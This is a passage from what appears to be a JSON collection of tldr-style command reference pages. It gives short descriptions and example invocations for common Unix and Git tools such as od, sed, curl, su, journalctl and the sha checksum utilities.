    "git-update-index": "# git update-index\n> Git command for manipulating the index. More information: https://git-\n> scm.com/docs/git-update-index.\n  * Pretend that a modified file is unchanged (`git status` will not show this as changed):\n`git update-index --skip-worktree {{path/to/modified_file}}`",
    "valgrind": "# valgrind\n> Wrapper for a set of expert tools for profiling, optimizing and debugging\n> programs. Commonly used tools include `memcheck`, `cachegrind`, `callgrind`,\n> `massif`, `helgrind`, and `drd`. More information: http://www.valgrind.org.\n  * Use the (default) Memcheck tool to show a diagnostic of memory usage by `program`:\n`valgrind {{program}}`\n  * Use Memcheck to report all possible memory leaks of `program` in full detail:\n`valgrind --leak-check=full --show-leak-kinds=all {{program}}`\n  * Use the Cachegrind tool to profile and log CPU cache operations of `program`:\n`valgrind --tool=cachegrind {{program}}`\n  * Use the Massif tool to profile and log heap memory and stack usage of `program`:\n`valgrind --tool=massif --stacks=yes {{program}}`",
    "od": "# od\n> Display file contents in octal, decimal or hexadecimal format. Optionally\n> display the byte offsets and/or printable representation for each line. More\n> information: https://www.gnu.org/software/coreutils/od.\n  * Display file using default settings: octal format, 8 bytes per line, byte offsets in octal, and duplicate lines replaced with `*`:\n`od {{path/to/file}}`\n  * Display file in verbose mode, i.e. without replacing duplicate lines with `*`:\n`od -v {{path/to/file}}`\n  * Display file in hexadecimal format (2-byte units), with byte offsets in decimal format:\n`od --format={{x}} --address-radix={{d}} -v {{path/to/file}}`\n  * Display file in hexadecimal format (1-byte units), and 4 bytes per line:\n`od --format={{x1}} --width={{4}} -v {{path/to/file}}`\n  * Display file in hexadecimal format along with its character representation, and do not print byte offsets:\n`od --format={{xz}} --address-radix={{n}} -v {{path/to/file}}`\n  * Read only 100 bytes of a file starting from the 500th byte:\n`od --read-bytes {{100}} --skip-bytes={{500}} -v {{path/to/file}}`",
    "uuencode": "# uuencode\n> Encode binary files into ASCII for transport via mediums that only support\n> simple ASCII encoding. More information: https://manned.org/uuencode.\n  * Encode a file and print the result to `stdout`:\n`uuencode {{path/to/input_file}} {{output_file_name_after_decoding}}`\n  * Encode a file and write the result to a file:\n`uuencode -o {{path/to/output_file}} {{path/to/input_file}}\n{{output_file_name_after_decoding}}`\n  * Encode a file using Base64 instead of the default uuencode encoding and write the result to a file:\n`uuencode -m -o {{path/to/output_file}} {{path/to/input_file}}\n{{output_file_name_after_decoding}}`",
    "b2sum": "# b2sum\n> Calculate BLAKE2 cryptographic checksums. More information:\n> https://www.gnu.org/software/coreutils/b2sum.\n  * Calculate the BLAKE2 checksum for one or more files:\n`b2sum {{path/to/file1 path/to/file2 ...}}`\n  * Calculate and save the list of BLAKE2 checksums to a file:\n`b2sum {{path/to/file1 path/to/file2 ...}} > {{path/to/file.b2}}`\n  * Calculate a BLAKE2 checksum from `stdin`:\n`{{command}} | b2sum`\n  * Read a file of BLAKE2 sums and filenames and verify all files have matching checksums:\n`b2sum --check {{path/to/file.b2}}`\n  * Only show a message for missing files or when verification fails:\n`b2sum --check --quiet {{path/to/file.b2}}`\n  * Only show a message when verification fails, ignoring missing files:\n`b2sum --ignore-missing --check --quiet {{path/to/file.b2}}`",
    "git-status": "# git status\n> Show the changes to files in a Git repository. Lists changed, added and\n> deleted files compared to the currently checked-out commit. More\n> information: https://git-scm.com/docs/git-status.\n  * Show changed files which are not yet added for commit:\n`git status`\n  * Give output in [s]hort format:\n`git status -s`\n  * Don't show untracked files in the output:\n`git status --untracked-files=no`\n  * Show output in [s]hort format along with [b]ranch info:\n`git status -sb`",
    "time": "# time\n> Measure how long a command took to run. Note: `time` can either exist as a\n> shell builtin, a standalone program or both. More information:\n> https://manned.org/time.\n  * Run the `command` and print the time measurements to `stdout`:\n`time {{command}}`",
    "split": "# split\n> Split a file into pieces. More information: https://ss64.com/osx/split.html.\n  * Split a file, each split having 10 lines (except the last split):\n`split -l {{10}} {{filename}}`\n  * Split a file by a regular expression. The matching line will be the first line of the next output file:\n`split -p {{cat|^[dh]og}} {{filename}}`\n  * Split a file with 512 bytes in each split (except the last split; use 512k for kilobytes and 512m for megabytes):\n`split -b {{512}} {{filename}}`\n  * Split a file into 5 files. File is split such that each split has same size (except the last split):\n`split -n {{5}} {{filename}}`",
    "su": "# su\n> Switch shell to another user. More information: https://manned.org/su.\n  * Switch to superuser (requires the root password):\n`su`\n  * Switch to a given user (requires the user's password):\n`su {{username}}`\n  * Switch to a given user and simulate a full login shell:\n`su - {{username}}`\n  * Execute a command as another user:\n`su - {{username}} -c \"{{command}}\"`",
    "git-reflog": "# git reflog\n> Show a log of changes to local references like HEAD, branches or tags. More\n> information: https://git-scm.com/docs/git-reflog.\n  * Show the reflog for HEAD:\n`git reflog`\n  * Show the reflog for a given branch:\n`git reflog {{branch_name}}`\n  * Show only the 5 latest entries in the reflog:\n`git reflog -n {{5}}`",
    "git-cat-file": "# git cat-file\n> Provide content or type and size information for Git repository objects.\n> More information: https://git-scm.com/docs/git-cat-file.\n  * Get the [s]ize of the HEAD commit in bytes:\n`git cat-file -s HEAD`\n  * Get the [t]ype (blob, tree, commit, tag) of a given Git object:\n`git cat-file -t {{8c442dc3}}`\n  * Pretty-[p]rint the contents of a given Git object based on its type:\n`git cat-file -p {{HEAD~2}}`",
    "clear": "# clear\n> Clears the screen of the terminal. More information:\n> https://manned.org/clear.\n  * Clear the screen (equivalent to pressing Control-L in Bash shell):\n`clear`\n  * Clear the screen but keep the terminal's scrollback buffer:\n`clear -x`\n  * Indicate the type of terminal to clean (defaults to the value of the environment variable `TERM`):\n`clear -T {{type_of_terminal}}`\n  * Show the version of `ncurses` used by `clear`:\n`clear -V`",
    "nice": "# nice\n> Execute a program with a custom scheduling priority (niceness). Niceness\n> values range from -20 (the highest priority) to 19 (the lowest). More\n> information: https://www.gnu.org/software/coreutils/nice.\n  * Launch a program with altered priority:\n`nice -n {{niceness_value}} {{command}}`",
    "echo": "# echo\n> Print given arguments. More information:\n> https://www.gnu.org/software/coreutils/echo.\n  * Print a text message. Note: quotes are optional:\n`echo \"{{Hello World}}\"`\n  * Print a message with environment variables:\n`echo \"{{My path is $PATH}}\"`\n  * Print a message without the trailing newline:\n`echo -n \"{{Hello World}}\"`\n  * Append a message to the file:\n`echo \"{{Hello World}}\" >> {{file.txt}}`\n  * Enable interpretation of backslash escapes (special characters):\n`echo -e \"{{Column 1\\tColumn 2}}\"`\n  * Print the exit status of the last executed command (Note: In Windows Command Prompt and PowerShell the equivalent commands are `echo %errorlevel%` and `$lastexitcode` respectively):\n`echo $?`",
    "flatpak": "# flatpak\n> Build, install and run flatpak applications and runtimes. More information:\n> https://docs.flatpak.org/en/latest/flatpak-command-reference.html#flatpak.\n  * Run an installed application:\n`flatpak run {{name}}`\n  * Install an application from a remote source:\n`flatpak install {{remote}} {{name}}`\n  * List all installed applications and runtimes:\n`flatpak list`\n  * Update all installed applications and runtimes:\n`flatpak update`\n  * Add a remote source:\n`flatpak remote-add --if-not-exists {{remote_name}} {{remote_url}}`\n  * Remove an installed application:\n`flatpak remove {{name}}`\n  * Remove all unused applications:\n`flatpak remove --unused`\n  * Show information about an installed application:\n`flatpak info {{name}}`",
    "cksum": "# cksum\n> Calculates CRC checksums and byte counts of a file. Note, on old UNIX\n> systems the CRC implementation may differ. More information:\n> https://www.gnu.org/software/coreutils/cksum.\n  * Display a 32-bit checksum, size in bytes and filename:\n`cksum {{path/to/file}}`",
    "git-for-each-repo": "# git for-each-repo\n> Run a Git command on a list of repositories. Note: this command is\n> experimental and may change. More information: https://git-scm.com/docs/git-\n> for-each-repo.\n  * Run maintenance on each of a list of repositories stored in the `maintenance.repo` user configuration variable:\n`git for-each-repo --config={{maintenance.repo}} {{maintenance run}}`\n  * Run `git pull` on each repository listed in a global configuration variable:\n`git for-each-repo --config={{global_configuration_variable}} {{pull}}`",
    "apropos": "# apropos\n> Search the manual pages for names and descriptions. More information:\n> https://manned.org/apropos.\n  * Search for a keyword using a regular expression:\n`apropos {{regular_expression}}`\n  * Search without restricting the output to the terminal width:\n`apropos -l {{regular_expression}}`\n  * Search for pages that contain all the expressions given:\n`apropos {{regular_expression_1}} -a {{regular_expression_2}} -a\n{{regular_expression_3}}`",
    "cat": "# cat\n> Print and concatenate files. More information:\n> https://keith.github.io/xcode-man-pages/cat.1.html.\n  * Print the contents of a file to `stdout`:\n`cat {{path/to/file}}`\n  * Concatenate several files into an output file:\n`cat {{path/to/file1 path/to/file2 ...}} > {{path/to/output_file}}`\n  * Append several files to an output file:\n`cat {{path/to/file1 path/to/file2 ...}} >> {{path/to/output_file}}`\n  * Copy the contents of a file into an output file without buffering:\n`cat -u {{/dev/tty12}} > {{/dev/tty13}}`\n  * Write `stdin` to a file:\n`cat - > {{path/to/file}}`\n  * Number all output lines:\n`cat -n {{path/to/file}}`\n  * Display non-printable and whitespace characters (with `M-` prefix if non-ASCII):\n`cat -v -t -e {{path/to/file}}`",
    "mailx": "# mailx\n> Send and receive mail. More information: https://manned.org/mailx.\n  * Send mail (the content should be typed after the command, and ended with `Ctrl+D`):\n`mailx -s \"{{subject}}\" {{to_addr}}`\n  * Send mail with content passed from another command:\n`echo \"{{content}}\" | mailx -s \"{{subject}}\" {{to_addr}}`\n  * Send mail with content read from a file:\n`mailx -s \"{{subject}}\" {{to_addr}} < {{content.txt}}`\n  * Send mail to a recipient and CC to another address:\n`mailx -s \"{{subject}}\" -c {{cc_addr}} {{to_addr}}`\n  * Send mail specifying the sender address:\n`mailx -s \"{{subject}}\" -r {{from_addr}} {{to_addr}}`\n  * Send mail with an attachment:\n`mailx -a {{path/to/file}} -s \"{{subject}}\" {{to_addr}}`",
    "dot": "# dot\n> Render an image of a `linear directed` network graph from a `graphviz` file.\n> Layouts: `dot`, `neato`, `twopi`, `circo`, `fdp`, `sfdp`, `osage` &\n> `patchwork`. More information: https://graphviz.org/doc/info/command.html.\n  * Render a `png` image with a filename based on the input filename and output format (uppercase -O):\n`dot -T {{png}} -O {{path/to/input.gv}}`\n  * Render a `svg` image with the specified output filename (lowercase -o):\n`dot -T {{svg}} -o {{path/to/image.svg}} {{path/to/input.gv}}`\n  * Render the output in `ps`, `pdf`, `svg`, `fig`, `png`, `gif`, `jpg`, `json`, or `dot` format:\n`dot -T {{format}} -O {{path/to/input.gv}}`\n  * Render a `gif` image using `stdin` and `stdout`:\n`echo \"{{digraph {this -> that} }}\" | dot -T {{gif}} > {{path/to/image.gif}}`\n  * Display help:\n`dot -?`",
    "whoami": "# whoami\n> Print the username associated with the current effective user ID. More\n> information: https://www.gnu.org/software/coreutils/whoami.\n  * Display currently logged username:\n`whoami`\n  * Display the username after a change in the user ID:\n`sudo whoami`",
    "realpath": "# realpath\n> Display the resolved absolute path for a file or directory. More\n> information: https://www.gnu.org/software/coreutils/realpath.\n  * Display the absolute path for a file or directory:\n`realpath {{path/to/file_or_directory}}`\n  * Require all path components to exist:\n`realpath --canonicalize-existing {{path/to/file_or_directory}}`\n  * Resolve \"..\" components before symlinks:\n`realpath --logical {{path/to/file_or_directory}}`\n  * Disable symlink expansion:\n`realpath --no-symlinks {{path/to/file_or_directory}}`\n  * Suppress error messages:\n`realpath --quiet {{path/to/file_or_directory}}`",
    "csplit": "# csplit\n> Split a file into pieces. This generates files named \"xx00\", \"xx01\", and so\n> on. More information: https://www.gnu.org/software/coreutils/csplit.\n  * Split a file at lines 5 and 23:\n`csplit {{path/to/file}} {{5}} {{23}}`\n  * Split a file every 5 lines (this will fail if the total number of lines is not divisible by 5):\n`csplit {{path/to/file}} {{5}} {*}`\n  * Split a file every 5 lines, ignoring exact-division error:\n`csplit -k {{path/to/file}} {{5}} {*}`\n  * Split a file at line 5 and use a custom prefix for the output files:\n`csplit {{path/to/file}} {{5}} -f {{prefix}}`\n  * Split a file at a line matching a regular expression:\n`csplit {{path/to/file}} /{{regular_expression}}/`",
    "journalctl": "# journalctl\n> Query the systemd journal. More information: https://manned.org/journalctl.\n  * Show all messages with priority level 3 (errors) from this [b]oot:\n`journalctl -b --priority={{3}}`\n  * Show all messages from last [b]oot:\n`journalctl -b -1`\n  * Delete journal logs which are older than 2 days:\n`journalctl --vacuum-time={{2d}}`\n  * [f]ollow new messages (like `tail -f` for traditional syslog):\n`journalctl -f`\n  * Show all messages by a specific [u]nit:\n`journalctl -u {{unit}}`\n  * Filter messages within a time range (either timestamp or placeholders like \"yesterday\"):\n`journalctl --since {{now|today|yesterday|tomorrow}} --until {{YYYY-MM-DD\nHH:MM:SS}}`\n  * Show all messages by a specific process:\n`journalctl _PID={{pid}}`\n  * Show all messages by a specific executable:\n`journalctl {{path/to/executable}}`",
    "head": "# head\n> Output the first part of files. More information:\n> https://keith.github.io/xcode-man-pages/head.1.html.\n  * Output the first few lines of a file:\n`head --lines {{8}} {{path/to/file}}`\n  * Output the first few bytes of a file:\n`head --bytes {{8}} {{path/to/file}}`\n  * Output everything but the last few lines of a file:\n`head --lines -{{8}} {{path/to/file}}`\n  * Output everything but the last few bytes of a file:\n`head --bytes -{{8}} {{path/to/file}}`",
    "basename": "# basename\n> Remove leading directory portions from a path. More information:\n> https://www.gnu.org/software/coreutils/basename.\n  * Show only the file name from a path:\n`basename {{path/to/file}}`\n  * Show only the rightmost directory name from a path:\n`basename {{path/to/directory/}}`\n  * Show only the file name from a path, with a suffix removed:\n`basename {{path/to/file}} {{suffix}}`",
    "git-maintenance": "# git-maintenance\n> Run tasks to optimize Git repository data. More information: https://git-\n> scm.com/docs/git-maintenance.\n  * Register the current repository in the user's list of repositories to daily have maintenance run:\n`git maintenance register`\n  * Start running maintenance on the current repository:\n`git maintenance start`\n  * Halt the background maintenance schedule for the current repository:\n`git maintenance stop`\n  * Remove the current repository from the user's maintenance repository list:\n`git maintenance unregister`\n  * Run a specific maintenance task on the current repository:\n`git maintenance run --task={{commit-graph|gc|incremental-repack|loose-\nobjects|pack-refs|prefetch}}`",
    "git-diff-files": "# git diff-files\n> Compare files using their sha1 hashes and modes. More information:\n> https://git-scm.com/docs/git-diff-files.\n  * Compare all changed files:\n`git diff-files`\n  * Compare only specified files:\n`git diff-files {{path/to/file}}`\n  * Show only the names of changed files:\n`git diff-files --name-only`\n  * Output a summary of extended header information:\n`git diff-files --summary`",
    "mv": "# mv\n> Move or rename files and directories. More information:\n> https://www.gnu.org/software/coreutils/mv.\n  * Rename a file or directory when the target is not an existing directory:\n`mv {{path/to/source}} {{path/to/target}}`\n  * Move a file or directory into an existing directory:\n`mv {{path/to/source}} {{path/to/existing_directory}}`\n  * Move multiple files into an existing directory, keeping the filenames unchanged:\n`mv {{path/to/source1 path/to/source2 ...}} {{path/to/existing_directory}}`\n  * Do not prompt for confirmation before overwriting existing files:\n`mv -f {{path/to/source}} {{path/to/target}}`\n  * Prompt for confirmation before overwriting existing files, regardless of file permissions:\n`mv -i {{path/to/source}} {{path/to/target}}`\n  * Do not overwrite existing files at the target:\n`mv -n {{path/to/source}} {{path/to/target}}`\n  * Move files in verbose mode, showing files after they are moved:\n`mv -v {{path/to/source}} {{path/to/target}}`",
    "loginctl": "# loginctl\n> Manage the systemd login manager. More information:\n> https://www.freedesktop.org/software/systemd/man/loginctl.html.\n  * Print all current sessions:\n`loginctl list-sessions`\n  * Print all properties of a specific session:\n`loginctl show-session {{session_id}} --all`\n  * Print all properties of a specific user:\n`loginctl show-user {{username}}`\n  * Print a specific property of a user:\n`loginctl show-user {{username}} --property={{property_name}}`\n  * Execute a `loginctl` operation on a remote host:\n`loginctl list-users -H {{hostname}}`",
    "runuser": "# runuser\n> Run commands as a specific user and group without asking for password (needs\n> root privileges). More information: https://manned.org/runuser.\n  * Run command as a different user:\n`runuser {{user}} -c '{{command}}'`\n  * Run command as a different user and group:\n`runuser {{user}} -g {{group}} -c '{{command}}'`\n  * Start a login shell as a specific user:\n`runuser {{user}} -l`\n  * Specify a shell for running instead of the default shell (also works for login):\n`runuser {{user}} -s {{/bin/sh}}`\n  * Preserve the entire environment of root (only if `--login` is not specified):\n`runuser {{user}} --preserve-environment -c '{{command}}'`",
    "man": "# man\n> Format and display manual pages. More information:\n> https://www.man7.org/linux/man-pages/man1/man.1.html.\n  * Display the man page for a command:\n`man {{command}}`\n  * Display the man page for a command from section 7:\n`man {{7}} {{command}}`\n  * List all available sections for a command:\n`man -f {{command}}`\n  * Display the path searched for manpages:\n`man --path`\n  * Display the location of a manpage rather than the manpage itself:\n`man -w {{command}}`\n  * Display the man page using a specific locale:\n`man {{command}} --locale={{locale}}`\n  * Search for manpages containing a search string:\n`man -k \"{{search_string}}\"`",
    "git-cherry": "# git cherry\n> Find commits that have yet to be applied upstream. More information:\n> https://git-scm.com/docs/git-cherry.\n  * Show commits (and their messages) with equivalent commits upstream:\n`git cherry -v`\n  * Specify a different upstream and topic branch:\n`git cherry {{origin}} {{topic}}`\n  * Limit commits to those within a given limit:\n`git cherry {{origin}} {{topic}} {{base}}`",
    "fold": "# fold\n> Wrap each line in an input file to fit a specified width and print it to\n> `stdout`. More information: https://manned.org/fold.1p.\n  * Wrap each line to default width (80 characters):\n`fold {{path/to/file}}`\n  * Wrap each line to width \"30\":\n`fold -w30 {{path/to/file}}`\n  * Wrap each line to width \"5\" and break the line at spaces (puts each space separated word in a new line, words with length > 5 are wrapped):\n`fold -w5 -s {{path/to/file}}`",
    "dirname": "# dirname\n> Calculates the parent directory of a given file or directory path. More\n> information: https://www.gnu.org/software/coreutils/dirname.\n  * Calculate the parent directory of a given path:\n`dirname {{path/to/file_or_directory}}`\n  * Calculate the parent directory of multiple paths:\n`dirname {{path/to/file_a}} {{path/to/directory_b}}`\n  * Delimit output with a NUL character instead of a newline (useful when combining with `xargs`):\n`dirname --zero {{path/to/directory_a}} {{path/to/file_b}}`",
    "base32": "# base32\n> Encode or decode file or `stdin` to/from Base32, to `stdout`. More\n> information: https://www.gnu.org/software/coreutils/base32.\n  * Encode a file:\n`base32 {{path/to/file}}`\n  * Decode a file:\n`base32 --decode {{path/to/file}}`\n  * Encode from `stdin`:\n`{{somecommand}} | base32`\n  * Decode from `stdin`:\n`{{somecommand}} | base32 --decode`",
    "git-commit-tree": "# git commit-tree\n> Low level utility to create commit objects. See also: `git commit`. More\n> information: https://git-scm.com/docs/git-commit-tree.\n  * Create a commit object with the specified message:\n`git commit-tree {{tree}} -m \"{{message}}\"`\n  * Create a commit object reading the message from a file (use `-` for `stdin`):\n`git commit-tree {{tree}} -F {{path/to/file}}`\n  * Create a GPG-signed commit object:\n`git commit-tree {{tree}} -m \"{{message}}\" --gpg-sign`\n  * Create a commit object with the specified parent commit object:\n`git commit-tree {{tree}} -m \"{{message}}\" -p {{parent_commit_sha}}`",
    "git-init": "# git init\n> Initializes a new local Git repository. More information: https://git-\n> scm.com/docs/git-init.\n  * Initialize a new local repository:\n`git init`\n  * Initialize a repository with the specified name for the initial branch:\n`git init --initial-branch={{branch_name}}`\n  * Initialize a repository using SHA256 for object hashes (requires Git version 2.29+):\n`git init --object-format={{sha256}}`\n  * Initialize a barebones repository, suitable for use as a remote over ssh:\n`git init --bare`",
    "sed": "# sed\n> Edit text in a scriptable manner. See also: `awk`, `ed`. More information:\n> https://keith.github.io/xcode-man-pages/sed.1.html.\n  * Replace all `apple` (basic regex) occurrences with `mango` (basic regex) in all input lines and print the result to `stdout`:\n`{{command}} | sed 's/apple/mango/g'`\n  * Execute a specific script [f]ile and print the result to `stdout`:\n`{{command}} | sed -f {{path/to/script_file.sed}}`\n  * Replace all `apple` (extended regex) occurrences with `APPLE` (extended regex) in all input lines and print the result to `stdout`:\n`{{command}} | sed -E 's/(apple)/\\U\\1/g'`\n  * Print just a first line to `stdout`:\n`{{command}} | sed -n '1p'`\n  * Replace all `apple` (basic regex) occurrences with `mango` (basic regex) in a `file` and save a backup of the original to `file.bak`:\n`sed -i bak 's/apple/mango/g' {{path/to/file}}`",
    "ex": "# ex\n> Command-line text editor. See also: `vim`. More information:\n> https://www.vim.org.\n  * Open a file:\n`ex {{path/to/file}}`\n  * Save and Quit:\n`wq<Enter>`\n  * Undo the last operation:\n`undo<Enter>`\n  * Search for a pattern in the file:\n`/{{search_pattern}}<Enter>`\n  * Perform a regular expression substitution in the whole file:\n`%s/{{regular_expression}}/{{replacement}}/g<Enter>`\n  * Insert text:\n`i<Enter>{{text}}<C-c>`\n  * Switch to Vim:\n`visual<Enter>`",
    "look": "# look\n> Look for lines in sorted file. More information: https://manned.org/look.\n  * Look for lines which begins with the given prefix:\n`look {{prefix}} {{path/to/file}}`\n  * Look for lines ignoring case:\n`look --ignore-case {{prefix}} {{path/to/file}}`",
    "fgrep": "# fgrep\n> Matches fixed strings in files. Equivalent to `grep -F`. More information:\n> https://www.gnu.org/software/grep/manual/grep.html.\n  * Search for an exact string in a file:\n`fgrep {{search_string}} {{path/to/file}}`\n  * Search only lines that match entirely in files:\n`fgrep -x {{path/to/file1}} {{path/to/file2}}`\n  * Count the number of lines that match the given string in a file:\n`fgrep -c {{search_string}} {{path/to/file}}`\n  * Show the line number in the file along with the line matched:\n`fgrep -n {{search_string}} {{path/to/file}}`\n  * Display all lines except those that contain the search string:\n`fgrep -v {{search_string}} {{path/to/file}}`\n  * Display filenames whose content matches the search string at least once:\n`fgrep -l {{search_string}} {{path/to/file1}} {{path/to/file2}}`",
    "updatedb": "# updatedb\n> Create or update the database used by `locate`. It is usually run daily by\n> cron. More information: https://manned.org/updatedb.\n  * Refresh database content:\n`sudo updatedb`\n  * Display file names as soon as they are found:\n`sudo updatedb --verbose`",
    "sort": "# sort\n> Sort lines of text files. More information:\n> https://www.gnu.org/software/coreutils/sort.\n  * Sort a file in ascending order:\n`sort {{path/to/file}}`\n  * Sort a file in descending order:\n`sort --reverse {{path/to/file}}`\n  * Sort a file in case-insensitive way:\n`sort --ignore-case {{path/to/file}}`\n  * Sort a file using numeric rather than alphabetic order:\n`sort --numeric-sort {{path/to/file}}`\n  * Sort `/etc/passwd` by the 3rd field of each line numerically, using \":\" as a field separator:\n`sort --field-separator={{:}} --key={{3n}} {{/etc/passwd}}`\n  * Sort a file preserving only unique lines:\n`sort --unique {{path/to/file}}`\n  * Sort a file, printing the output to the specified output file (can be used to sort a file in-place):\n`sort --output={{path/to/file}} {{path/to/file}}`\n  * Sort numbers with exponents:\n`sort --general-numeric-sort {{path/to/file}}`",
    "lex": "# lex\n> Lexical analyzer generator. Given the specification for a lexical analyzer,\n> generates C code implementing it. More information:\n> https://keith.github.io/xcode-man-pages/lex.1.html.\n  * Generate an analyzer from a Lex file:\n`lex {{analyzer.l}}`\n  * Specify the output file:\n`lex {{analyzer.l}} --outfile {{analyzer.c}}`\n  * Compile a C file generated by Lex:\n`cc {{path/to/lex.yy.c}} --output {{executable}}`",
    "ulimit": "# ulimit\n> Get and set user limits. More information: https://manned.org/ulimit.\n  * Get the properties of all the user limits:\n`ulimit -a`\n  * Get hard limit for the number of simultaneously opened files:\n`ulimit -H -n`\n  * Get soft limit for the number of simultaneously opened files:\n`ulimit -S -n`\n  * Set max per-user process limit:\n`ulimit -u 30`",
    "chfn": "# chfn\n> Update `finger` info for a user. More information: https://manned.org/chfn.\n  * Update a user's \"Name\" field in the output of `finger`:\n`chfn -f {{new_display_name}} {{username}}`\n  * Update a user's \"Office Room Number\" field for the output of `finger`:\n`chfn -o {{new_office_room_number}} {{username}}`\n  * Update a user's \"Office Phone Number\" field for the output of `finger`:\n`chfn -p {{new_office_telephone_number}} {{username}}`\n  * Update a user's \"Home Phone Number\" field for the output of `finger`:\n`chfn -h {{new_home_telephone_number}} {{username}}`",
    "tail": "# tail\n> Display the last part of a file. See also: `head`. More information:\n> https://manned.org/man/freebsd-13.0/tail.1.\n  * Show last 'count' lines in file:\n`tail -n {{8}} {{path/to/file}}`\n  * Print a file from a specific line number:\n`tail -n +{{8}} {{path/to/file}}`\n  * Print a specific count of bytes from the end of a given file:\n`tail -c {{8}} {{path/to/file}}`\n  * Print the last lines of a given file and keep reading file until `Ctrl + C`:\n`tail -f {{path/to/file}}`\n  * Keep reading file until `Ctrl + C`, even if the file is inaccessible:\n`tail -F {{path/to/file}}`\n  * Show last 'count' lines in 'file' and refresh every 'seconds' seconds:\n`tail -n {{8}} -s {{10}} -f {{path/to/file}}`",
    "ctags": "# ctags\n> Generates an index (or tag) file of language objects found in source files\n> for many popular programming languages. More information: https://ctags.io/.\n  * Generate tags for a single file, and output them to a file named \"tags\" in the current directory, overwriting the file if it exists:\n`ctags {{path/to/file}}`\n  * Generate tags for all files in the current directory, and output them to a specific file, overwriting the file if it exists:\n`ctags -f {{path/to/file}} *`\n  * Generate tags for all files in the current directory and all subdirectories:\n`ctags --recurse`\n  * Generate tags for a single file, and output them with start line number and end line number in JSON format:\n`ctags --fields=+ne --output-format=json {{path/to/file}}`",
    "mkdir": "# mkdir\n> Create directories and set their permissions. More information:\n> https://www.gnu.org/software/coreutils/mkdir.\n  * Create specific directories:\n`mkdir {{path/to/directory1 path/to/directory2 ...}}`\n  * Create specific directories and their [p]arents if needed:\n`mkdir -p {{path/to/directory1 path/to/directory2 ...}}`\n  * Create directories with specific permissions:\n`mkdir -m {{rwxrw-r--}} {{path/to/directory1 path/to/directory2 ...}}`",
    "sha384sum": "# sha384sum\n> Calculate SHA384 cryptographic checksums. More information:\n> https://www.gnu.org/software/coreutils/manual/html_node/sha2-utilities.html.\n  * Calculate the SHA384 checksum for one or more files:\n`sha384sum {{path/to/file1 path/to/file2 ...}}`\n  * Calculate and save the list of SHA384 checksums to a file:\n`sha384sum {{path/to/file1 path/to/file2 ...}} > {{path/to/file.sha384}}`\n  * Calculate a SHA384 checksum from `stdin`:\n`{{command}} | sha384sum`\n  * Read a file of SHA384 sums and filenames and verify all files have matching checksums:\n`sha384sum --check {{path/to/file.sha384}}`\n  * Only show a message for missing files or when verification fails:\n`sha384sum --check --quiet {{path/to/file.sha384}}`\n  * Only show a message when verification fails, ignoring missing files:\n`sha384sum --ignore-missing --check --quiet {{path/to/file.sha384}}`",
    "git-update-ref": "# git update-ref\n> Git command for creating, updating, and deleting Git refs. More information:\n> https://git-scm.com/docs/git-update-ref.\n  * Delete a ref, useful for soft resetting the first commit:\n`git update-ref -d {{HEAD}}`\n  * Update ref with a message:\n`git update-ref -m {{message}} {{HEAD}} {{4e95e05}}`",
    "sum": "# sum\n> Compute checksums and the number of blocks for a file. A predecessor to the\n> more modern `cksum`. More information:\n> https://www.gnu.org/software/coreutils/sum.\n  * Compute a checksum with BSD-compatible algorithm and 1024-byte blocks:\n`sum {{path/to/file}}`\n  * Compute a checksum with System V-compatible algorithm and 512-byte blocks:\n`sum --sysv {{path/to/file}}`",
    "sha256sum": "# sha256sum\n> Calculate SHA256 cryptographic checksums. More information:\n> https://www.gnu.org/software/coreutils/manual/html_node/sha2-utilities.html.\n  * Calculate the SHA256 checksum for one or more files:\n`sha256sum {{path/to/file1 path/to/file2 ...}}`\n  * Calculate and save the list of SHA256 checksums to a file:\n`sha256sum {{path/to/file1 path/to/file2 ...}} > {{path/to/file.sha256}}`\n  * Calculate a SHA256 checksum from `stdin`:\n`{{command}} | sha256sum`\n  * Read a file of SHA256 sums and filenames and verify all files have matching checksums:\n`sha256sum --check {{path/to/file.sha256}}`\n  * Only show a message for missing files or when verification fails:\n`sha256sum --check --quiet {{path/to/file.sha256}}`\n  * Only show a message when verification fails, ignoring missing files:\n`sha256sum --ignore-missing --check --quiet {{path/to/file.sha256}}`",
    "curl": "# curl\n> Transfers data from or to a server. Supports most protocols, including HTTP,\n> FTP, and POP3. More information: https://curl.se/docs/manpage.html.\n  * Download the contents of a URL to a file:\n`curl {{http://example.com}} --output {{path/to/file}}`\n  * Download a file, saving the output under the filename indicated by the URL:\n`curl --remote-name {{http://example.com/filename}}`\n  * Download a file, following location redirects, and automatically continuing (resuming) a previous file transfer and return an error on server error:\n`curl --fail --remote-name --location --continue-at -\n{{http://example.com/filename}}`\n  * Send form-encoded data (POST request of type `application/x-www-form-urlencoded`). Use `--data @file_name` or `--data @'-'` to read from STDIN:\n`curl --data {{'name=bob'}} {{http://example.com/form}}`\n  * Send a request with an extra header, using a custom HTTP method:\n`curl --header {{'X-My-Header: 123'}} --request {{PUT}}\n{{http://example.com}}`\n  * Send data in JSON format, specifying the appropriate content-type header:\n`curl --data {{'{\"name\":\"bob\"}'}} --header {{'Content-Type:\napplication/json'}} {{http://example.com/users/1234}}`\n  * Pass a username and password for server authentication:\n`curl --user myusername:mypassword {{http://example.com}}`\n  * Pass client certificate and key for a resource, skipping certificate validation:\n`curl --cert {{client.pem}} --key {{key.pem}} --insecure\n{{https://example.com}}`",
    "git-verify-commit": "# git verify-commit\n> Check for GPG verification of commits. If no commits are verified, nothing\n> will be printed, regardless of options specified. More information:\n> https://git-scm.com/docs/git-verify-commit.\n  * Check commits for a GPG signature:\n`git verify-commit {{commit_hash1 optional_commit_hash2 ...}}`\n  * Check commits for a GPG signature and show details of each commit:\n`git verify-commit {{commit_hash1 optional_commit_hash2 ...}} --verbose`\n  * Check commits for a GPG signature and print the raw details:\n`git verify-commit {{commit_hash1 optional_commit_hash2 ...}} --raw`",
    "getfacl": "# getfacl\n> Get file access control lists. More information: https://manned.org/getfacl.\n  * Display the file access control list:\n`getfacl {{path/to/file_or_directory}}`\n  * Display the file access control list with numeric user and group IDs:\n`getfacl -n {{path/to/file_or_directory}}`\n  * Display the file access control list with tabular output format:\n`getfacl -t {{path/to/file_or_directory}}`",
